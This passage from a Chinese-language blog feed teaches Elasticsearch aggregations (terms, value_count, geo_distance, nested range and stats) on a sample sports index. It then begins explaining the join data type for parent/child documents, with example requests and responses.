ing&quot;,&quot;birthdate&quot;:&quot;1992-5-20&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;4&quot;,&quot;3&quot;],&quot;location&quot;:&quot;45.22,-68.53&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Duke&quot;,&quot;birthdate&quot;:&quot;1992-2-28&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;5&quot;,&quot;2&quot;],&quot;location&quot;:&quot;46.22,-68.85&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Hal&quot;,&quot;birthdate&quot;:&quot;1990-9-9&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;4&quot;,&quot;2&quot;],&quot;location&quot;:&quot;45.12,-68.35&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Charge&quot;,&quot;birthdate&quot;:&quot;1990-4-1&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;3&quot;,&quot;2&quot;],&quot;location&quot;:&quot;46.12,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Barry&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;5&quot;,&quot;2&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Bank&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Golf&quot;,&quot;rating&quot;:[&quot;6&quot;,&quot;4&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Bingo&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Golf&quot;,&quot;rating&quot;:[&quot;10&quot;,&quot;7&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;James&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Basketball&quot;,&quot;rating&quot;:[&quot;10&quot;,&quot;8&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Wayne&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Hockey&quot;,&quot;rating&quot;:[&quot;10&quot;,&quot;10&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Brady&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Football&quot;,&quot;rating&quot;:[&quot;10&quot;,&quot;10&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Lewis&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Football&quot;,&quot;rating&quot;:[&quot;10&quot;,&quot;10&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;通过上面的bulk API接口，我们可以把我们想要的数据输入到sports的索引中。我们可以通过如下的接口来获得我多少条数据：1GET sports/_count显示结果：123456789&#123; &quot;count&quot; : 22, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;&#125;在这个数据库里，我们有可以看到有22条的数据。动手实践聚合的两个主要系列是指标聚合（metric aggregations）(https://www.elastic.co/guide/en/elasticsearch/reference/master/search-aggregations-metrics.html)和存储桶聚合（bucket aggregation）(https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket.html)。指标聚合计算一组文档中的某些值（例如平均值）； 存储桶聚合将文档分组到存储桶中。 在详细介绍之前，让我们看一下聚合请求的一般结构。除此之前，聚合还有Matrix(https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-matrix.html)及Pipleline(https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-pipeline.html聚合。Aggregation结构123456789&quot;aggregations&quot; : &#123; &quot;&lt;aggregation_name&gt;&quot; : &#123; &quot;&lt;aggregation_type&gt;&quot; : &#123; &lt;aggregation_body&gt; &#125;, [&quot;aggregations&quot; : &#123; [&lt;sub_aggregation&gt;]* &#125; ] &#125; [,&quot;&lt;aggregation_name_2&gt;&quot; : &#123; ... &#125; ]*&#125;请求json中的聚合（您也可以改用aggs）对象包含聚合名称，类型和主体。 &lt;aggregation_name&gt;是用户定义的名称（不带括号），该名称将唯一标识响应中的聚合名称/键。&lt;aggregation_type&gt;通常是聚合中的第一个键。 它可以是terms，stats或geo-distance聚合，但这是它的起点。 在我们的&lt;aggregation_type&gt;中，我们有一个&lt;aggregation_body&gt;。 在&lt;aggregation_body&gt;中，我们指定聚合所需的属性。 可用属性取决于聚合的类型。您可以选择提供子聚合，以将一个聚合元素的结果嵌套到另一个聚合元素中。 此外，您可以在查询中输入多个聚合（aggregation_name_2），以具有更多单独的顶级聚合。 尽管对嵌套级别没有限制，但是您不能将度量标准嵌套在度量标准聚合中，原因如下所述。 在研究可以聚合的不同类型的值之后，我们将了解桶聚合和度量聚合之间的区别。例子一些聚合使用从聚合文档中获取的值。 这些值可以从指定的文档字段（field）中获取，也可以从随每个文档生成值的脚本中获取。 下面的第一个示例在名称字段上提供了术语聚合(terms aggregation)，在子聚合rating_avg值上给出了顺序。 如您所见，我们使用嵌套的指标聚合对存储桶聚合的结果进行排序。尽管我们使用上面给出的索引，但是我们鼓励您运行此查询（以及下面的其他查询）。 您可以从工作中获得直接结果，然后对其进行修改以匹配您的数据集。另外，请仔细查看我们是否包含“ size”：0，因为我们的重点是聚合结果，而不是文档结果。这里设置为0，表示我们不想得到任何的文档。123456789101112131415161718192021GET sports/_search&#123; &quot;size&quot;: 0, &quot;aggregations&quot;: &#123; &quot;the_name&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;name&quot;, &quot;order&quot;: &#123; &quot;rating_avg&quot;: &quot;desc&quot; &#125; &#125;, &quot;aggregations&quot;: &#123; &quot;rating_avg&quot;: &#123; &quot;avg&quot;: &#123; &quot;field&quot;: &quot;rating&quot; &#125; &#125; &#125; &#125; &#125;&#125;显示的结果为：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&#123; &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 22, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;the_name&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 12, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;Brady&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 10.0 &#125; &#125;, &#123; &quot;key&quot; : &quot;Lewis&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 10.0 &#125; &#125;, &#123; &quot;key&quot; : &quot;Wayne&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 10.0 &#125; &#125;, &#123; &quot;key&quot; : &quot;James&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 9.0 &#125; &#125;, &#123; &quot;key&quot; : &quot;Bingo&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 8.5 &#125; &#125;, &#123; &quot;key&quot; : &quot;Bank&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 5.0 &#125; &#125;, &#123; &quot;key&quot; : &quot;Michael&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 4.5 &#125; &#125;, &#123; &quot;key&quot; : &quot;Will&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 4.0 &#125; &#125;, &#123; &quot;key&quot; : &quot;Barry&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 3.5 &#125; &#125;, &#123; &quot;key&quot; : &quot;Bob&quot;, &quot;doc_count&quot; : 1, &quot;rating_avg&quot; : &#123; &quot;value&quot; : 3.5 &#125; &#125; ] &#125; &#125;&#125;上面的结果显示：我们得到了按照每个人来进行分类的聚合，而他们的顺序是按照rating_avg聚合所获得平均分数来排序的。我们还可以提供一个script脚本来生成聚合所使用的值:123456789101112131415161718192021222324252627GET sports/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;age_range&quot;: &#123; &quot;range&quot;: &#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot; ZonedDateTime dob = doc[&apos;birthdate&apos;].value; return params.now - dob.getYear() &quot;&quot;&quot; , &quot;params&quot;: &#123; &quot;now&quot;: 2019 &#125; &#125;, &quot;ranges&quot;: [ &#123; &quot;from&quot;: 30, &quot;to&quot;: 31 &#125; ] &#125; &#125; &#125;&#125;在上面，我们通过脚本生产value source，并对它做出统计。显示的结果是：123456789101112131415161718192021222324252627282930&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 22, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;age_range&quot; : &#123; &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;30.0-31.0&quot;, &quot;from&quot; : 30.0, &quot;to&quot; : 31.0, &quot;doc_count&quot; : 4 &#125; ] &#125; &#125;&#125;上面显示在30至31岁之间的有4个人。Metric Aggregations指标聚合类型用于计算整个文档集的指标。 有单值指标聚合（例如avg）和多值指标聚合（例如stats）。 指标聚合的一个简单示例是value_count聚合，它仅返回已为给定字段建立索引的值的总数。 要在运动员数据集中的“sport”字段中找到值的数量，我们可以使用以下查询：1234567891011GET sports/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;sport_count&quot;: &#123; &quot;value_count&quot;: &#123; &quot;field&quot;: &quot;sport&quot; &#125; &#125; &#125;&#125;显示结果：1234567891011121314151617181920212223&#123; &quot;took&quot; : 2, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 22, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;sport_count&quot; : &#123; &quot;value&quot; : 22 &#125; &#125;&#125;请注意，这将返回该字段的值总数，而不是唯一值的数目。 因此，在这种情况下（由于每个文档在“ sport”字段中都有一个单词值），结果仅等于索引中的文档数。Bucket Aggregations存储桶聚合是用于对文档进行分组的机制。 每种类型的存储桶聚合都有自己的分割文档集的方法。 也许最简单的类型是术语聚合。 这个功能非常像术语方面，返回给定字段索引的唯一术语以及匹配文档的数量。 如果我们想在数据集中的“sport”字段中找到所有值，则可以使用以下方法：123456789101112GET sports/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;sport&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;sport&quot;, &quot;size&quot;: 10 &#125; &#125; &#125;&#125;返回值：12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 22, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;sport&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;Baseball&quot;, &quot;doc_count&quot; : 16 &#125;, &#123; &quot;key&quot; : &quot;Football&quot;, &quot;doc_count&quot; : 2 &#125;, &#123; &quot;key&quot; : &quot;Golf&quot;, &quot;doc_count&quot; : 2 &#125;, &#123; &quot;key&quot; : &quot;Basketball&quot;, &quot;doc_count&quot; : 1 &#125;, &#123; &quot;key&quot; : &quot;Hockey&quot;, &quot;doc_count&quot; : 1 &#125; ] &#125; &#125;&#125;您可能会发现geo_distance聚合更具吸引力。 尽管它有许多选项，但在最简单的情况下，它取一个原点和一个距离范围，然后根据给定的geo_point字段计算圆中有多少文档。假设我们需要知道多少个运动员居住在距离地理位置“ 46.12，-68.55” 20英里范围内。 我们可以使用以下聚合：12345678910111213141516171819GET sports/_search&#123; &quot;size&quot;: 0, &quot;aggregations&quot;: &#123; &quot;baseball_player_ring&quot;: &#123; &quot;geo_distance&quot;: &#123; &quot;field&quot;: &quot;location&quot;, &quot;origin&quot;: &quot;46.12,-68.55&quot;, &quot;unit&quot;: &quot;mi&quot;, &quot;ranges&quot;: [ &#123; &quot;from&quot;: 0, &quot;to&quot;: 20 &#125; ] &#125; &#125; &#125;&#125;返回结果：123456789101112131415161718192021222324252627282930&#123; &quot;took&quot; : 4, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 22, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;baseball_player_ring&quot; : &#123; &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;*-20.0&quot;, &quot;from&quot; : 0.0, &quot;to&quot; : 20.0, &quot;doc_count&quot; : 14 &#125; ] &#125; &#125;&#125;内嵌 Bucket Aggregations许多开发人员会同意，桶聚合的最强大方面是嵌套它们的能力。 您可以定义顶级存储桶聚合，并在其内部定义对每个结果存储桶进行操作的第二级聚合。 此嵌套可以根据需要扩展到多个级别。继续我们的示例，我们可以使用按年龄划分的嵌套范围聚合（根据脚本的“出生日期”计算得出）来进一步细分geo_distance聚合的结果。 假设我们想知道属于两个年龄段的每个运动员中有多少运动员（他们生活在上一节中定义的圈子内）。 我们可以使用以下聚合来获取此信息：12345678910111213141516171819202122232425262728293031323334353637383940GET sports/_search&#123; &quot;size&quot;: 0, &quot;aggregations&quot;: &#123; &quot;baseball_player_ring&quot;: &#123; &quot;geo_distance&quot;: &#123; &quot;field&quot;: &quot;location&quot;, &quot;origin&quot;: &quot;46.12,-68.55&quot;, &quot;unit&quot;: &quot;mi&quot;, &quot;ranges&quot;: [ &#123; &quot;from&quot;: 0, &quot;to&quot;: 20 &#125; ] &#125;, &quot;aggregations&quot;: &#123; &quot;ring_age_ranges&quot;: &#123; &quot;range&quot;: &#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot; ZonedDateTime dob = doc[&apos;birthdate&apos;].value; return params.now - dob.getYear() &quot;&quot;&quot; , &quot;params&quot;: &#123; &quot;now&quot;: 2019 &#125; &#125;, &quot;ranges&quot;: [ &#123; &quot;from&quot;: 30, &quot;to&quot;: 31 &#125;, &#123; &quot;from&quot;: 31, &quot;to&quot;: 32 &#125; ] &#125; &#125; &#125; &#125; &#125;&#125;显示的结果为：12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 22, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;baseball_player_ring&quot; : &#123; &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;*-20.0&quot;, &quot;from&quot; : 0.0, &quot;to&quot; : 20.0, &quot;doc_count&quot; : 14, &quot;ring_age_ranges&quot; : &#123; &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;30.0-31.0&quot;, &quot;from&quot; : 30.0, &quot;to&quot; : 31.0, &quot;doc_count&quot; : 2 &#125;, &#123; &quot;key&quot; : &quot;31.0-32.0&quot;, &quot;from&quot; : 31.0, &quot;to&quot; : 32.0, &quot;doc_count&quot; : 8 &#125; ] &#125; &#125; ] &#125; &#125;&#125;现在，让我们使用stats（多值指标汇总器）来计算最内部结果的一些统计数据。 对于居住在我们圈子中的运动员以及两个年龄段的每个年龄段，我们现在都希望根据结果文档计算“rating”字段的统计信息：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647GET sports/_search&#123; &quot;size&quot;: 0, &quot;aggregations&quot;: &#123; &quot;baseball_player_ring&quot;: &#123; &quot;geo_distance&quot;: &#123; &quot;field&quot;: &quot;location&quot;, &quot;origin&quot;: &quot;46.12,-68.55&quot;, &quot;unit&quot;: &quot;mi&quot;, &quot;ranges&quot;: [ &#123; &quot;from&quot;: 0, &quot;to&quot;: 20 &#125; ] &#125;, &quot;aggregations&quot;: &#123; &quot;ring_age_ranges&quot;: &#123; &quot;range&quot;: &#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot; ZonedDateTime dob = doc[&apos;birthdate&apos;].value; return params.now - dob.getYear() &quot;&quot;&quot; , &quot;params&quot;: &#123; &quot;now&quot;: 2019 &#125; &#125;, &quot;ranges&quot;: [ &#123; &quot;from&quot;: 30, &quot;to&quot;: 31 &#125;, &#123; &quot;from&quot;: 31, &quot;to&quot;: 32 &#125; ] &#125;, &quot;aggregations&quot;: &#123; &quot;rating_stats&quot;: &#123; &quot;stats&quot;: &#123; &quot;field&quot;: &quot;rating&quot; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;我们得到一个我们需要的统计信息的响应：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 22, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;baseball_player_ring&quot; : &#123; &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;*-20.0&quot;, &quot;from&quot; : 0.0, &quot;to&quot; : 20.0, &quot;doc_count&quot; : 14, &quot;ring_age_ranges&quot; : &#123; &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;30.0-31.0&quot;, &quot;from&quot; : 30.0, &quot;to&quot; : 31.0, &quot;doc_count&quot; : 2, &quot;rating_stats&quot; : &#123; &quot;count&quot; : 4, &quot;min&quot; : 3.0, &quot;max&quot; : 5.0, &quot;avg&quot; : 4.0, &quot;sum&quot; : 16.0 &#125; &#125;, &#123; &quot;key&quot; : &quot;31.0-32.0&quot;, &quot;from&quot; : 31.0, &quot;to&quot; : 32.0, &quot;doc_count&quot; : 8, &quot;rating_stats&quot; : &#123; &quot;count&quot; : 16, &quot;min&quot; : 2.0, &quot;max&quot; : 10.0, &quot;avg&quot; : 7.5, &quot;sum&quot; : 120.0 &#125; &#125; ] &#125; &#125; ] &#125; &#125;&#125;如您所见，您可以创建一个包含多个存储更多存储桶的大存储桶。 您还可以获取每个存储分区的指标（metrics)，以及不断提高的复杂性。 通过这些简单的构建块，您可以使用嵌套聚合从数据中获得深刻而复杂的见解。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch： Join数据类型]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9A%20Join%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[在Elasticsearch中，Join可以让我们创建parent/child关系。Elasticsearch不是一个RDMS。通常join数据类型尽量不要使用，除非不得已。那么Elasticsearch为什么需要Join数据类型呢？在Elasticsearch中，更新一个object需要root object一个完整的reindex：即使是一个field的一个字符的改变即便是nested object也需要完整的reindex才可以实现搜索通常情况下，这是完全OK的，但是在有些场合下，如果我们有频繁的更新操作，这样可能对性能带来很大的影响。如果你的数据需要频繁的更新，并带来性能上的影响，这个时候，join数据类型可能是你的一个解决方案。join数据类型可以完全地把两个object分开，但是还是保持这两者之前的关系。parent及child是完全分开的两个文档parent可以单独更新而不需要重新reindex childchildren可以任意被添加/串改/删除而不影响parent及其它的children与 nested类型类似，父子关系也允许您将不同的实体关联在一起，但它们在实现和行为上有所不同。 与nested文档不同，它们不在同一文档中，而parent/child文档是完全独立的文档。 它们遵循一对多关系原则，允许您将一种类型定义为parent类型，将一种或多种类型定义为child类型即便join数据类型给我们带来了方便，但是，它也在搜索时给我带来额外的内存及计算方便的开销。注意：目前Kibana对nested及join数据类型有比较少的支持。如果你想使用Kibana来在dashboard里展示数据，这个方面的你需要考虑。在未来，这种情况可能会发生改变。join数据类型是一个特殊字段，用于在同一索引的文档中创建父/子关系。 关系部分定义文档中的一组可能关系，每个关系是父（parent)名称和子（child)名称。一个例子：12345678910111213PUT my_index&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;my_join_field&quot;: &#123; &quot;type&quot;: &quot;join&quot;, &quot;relations&quot;: &#123; &quot;question&quot;: &quot;answer&quot; &#125; &#125; &#125; &#125;&#125;在这里我们定义了一个叫做my_index的索引。在这个索引中，我们定义了一个field，它的名字是my_join_field。它的类型是join数据类型。同时我们定义了单个关系：question是answer的parent。要使用join来index文档，必须在source中提供关系的name和文档的可选parent。 例如，以下示例在question上下文中创建两个parent文档：123456789101112131415PUT my_index/_doc/1?refresh&#123; &quot;text&quot;: &quot;This is a question&quot;, &quot;my_join_field&quot;: &#123; &quot;name&quot;: &quot;question&quot; &#125;&#125; PUT my_index/_doc/2?refresh&#123; &quot;text&quot;: &quot;This is another question&quot;, &quot;my_join_field&quot;: &#123; &quot;name&quot;: &quot;question&quot; &#125;&#125;这里采用refresh来强制进行索引，以便接下来的搜索。在这里name标识question，说明这个文档时一个question文档。索引parent文档时，您可以选择仅将关系的名称指定为快捷方式，而不是将其封装在普通对象表示法中：1234567891011PUT my_index/_doc/1?refresh&#123; &quot;text&quot;: &quot;This is a question&quot;, &quot;my_join_field&quot;: &quot;question&quot; &#125; PUT my_index/_doc/2?refresh&#123; &quot;text&quot;: &quot;This is another question&quot;, &quot;my_join_field&quot;: &quot;question&quot;&#125;这种方法和前面的是一样的，只是这里我们只使用了question, 而不是一个像第一种方法那样，使用如下的一个对象来表达：123&quot;my_join_field&quot;: &#123; &quot;name&quot;: &quot;question&quot; &#125;在实际的使用中，你可以根据自己的喜好来使用。索引child项时，必须在_source中添加关系的名称以及文档的parent id。注意：需要在同一分片中索引父级的谱系，必须使用其parent的id来确保这个child和parent是在一个shard中。每个文档分配在那个shard之中在默认的情况下是按照文档的id进行一些hash来分配的，当然也可以通过routing来进行。针对child，我们使用其parent的id，这样就可以保证。否则在我们join数据的时候，跨shard是非常大的一个消费。例如，以下示例显示如何索引两个child文档：1234567891011121314151617PUT my_index/_doc/3?routing=1?refresh (1)&#123; &quot;text&quot;: &quot;This is an answer&quot;, &quot;my_join_field&quot;: &#123; &quot;name&quot;: &quot;answer&quot;, (2) &quot;parent&quot;: &quot;1&quot; (3) &#125;&#125; PUT my_index/_doc/4?routing=1?refresh&#123; &quot;text&quot;: &quot;This is another answer&quot;, &quot;my_join_field&quot;: &#123; &quot;name&quot;: &quot;answer&quot;, &quot;parent&quot;: &quot;1&quot; &#125;&#125;在上面的（1）处，我们必须使用routing，这样能确保parent和child是在同一个shard里。我们这里routing为1，这是因为parent的id 为1，在（3）处定义。(2) 处定义了该文档join的名称。parent-join及其性能join字段不应像关系数据库中的连接一样使用。 在Elasticsearch中，良好性能的关键是将数据去规范化为文档。 每个连接字段has_child或has_parent查询都会对查询性能产生重大影响。join字段有意义的唯一情况是，如果您的数据包含一对多关系，其中一个实体明显超过另一个实体。 这种情况的一个例子是产品的用例和这些产品的报价。 如果提供的产品数量明显多于产品数量，则将产品建模为父文档并将产品建模为子文档是有意义的。parent-join的限制对于每个index来说，只能有一个join字段parent及child文档，必须是在一个shard里建立索引。这也意味着，同样的routing值必须应用于getting, deleting或updating一个child文档。一个元素可以有多个children，但是只能有一个parent.可以对已有的join项添加新的关系也可以将child添加到现有元素，但仅当元素已经是parent时才可以。针对parent-join的搜索parent-join创建一个字段来索引文档中关系的名称（my_parent，my_child，…）。它还为每个parent/child关系创建一个字段。 此字段的名称是join字段的名称，后跟＃和关系中parent的名称。 因此，例如对于my_parent⇒[my_child，another_child]关系，join字段会创建一个名为my_join_field＃my_parent的附加字段。如果文档是子文件（my_child或another_child），则此字段包含文档链接到的parent_id，如果文档是parent文件（my_parent），则包含文档的_id。搜索包含join字段的索引时，始终在搜索响应中返回这两个字段：上面的描述比较绕口，我们还是以一个例子来说说明吧：1234567GET my_index/_search&#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;, &quot;sort&quot;: [&quot;_id&quot;]&#125;这里我们搜索所有的文档，并以_id进行排序：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&#123; &quot;took&quot; : 2, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 4, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;text&quot; : &quot;This is a question&quot;, &quot;my_join_field&quot; : &quot;question&quot; (1) &#125;, &quot;sort&quot; : [ &quot;1&quot; ] &#125;, &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;text&quot; : &quot;This is another question&quot;, &quot;my_join_field&quot; : &quot;question&quot; (2) &#125;, &quot;sort&quot; : [ &quot;2&quot; ] &#125;, &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;3&quot;, &quot;_score&quot; : null, &quot;_routing&quot; : &quot;1&quot;, &quot;_source&quot; : &#123; &quot;text&quot; : &quot;This is an answer&quot;, &quot;my_join_field&quot; : &#123; &quot;name&quot; : &quot;answer&quot;, (3) &quot;parent&quot; : &quot;1&quot; (4) &#125; &#125;, &quot;sort&quot; : [ &quot;3&quot; ] &#125;, &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : null, &quot;_routing&quot; : &quot;1&quot;, &quot;_source&quot; : &#123; &quot;text&quot; : &quot;This is another answer&quot;, &quot;my_join_field&quot; : &#123; &quot;name&quot; : &quot;answer&quot;, &quot;parent&quot; : &quot;1&quot; &#125; &#125;, &quot;sort&quot; : [ &quot;4&quot; ] &#125; ] &#125;&#125;在这里，我们可以看到4个文档：(1)表明这个文档是一个question join(2)表明这个文档是一个question join(3)表明这个文档是一个answer join(4)表明这个文档的parent是id为1的文档Parent-join 查询及aggregation可以在aggregation和script中访问join字段的值，并可以使用parent_id查询进行查询：123456789GET my_index/_search&#123; &quot;query&quot;: &#123; &quot;parent_id&quot;: &#123; &quot;type&quot;: &quot;answer&quot;, &quot;id&quot;: &quot;1&quot; &#125; 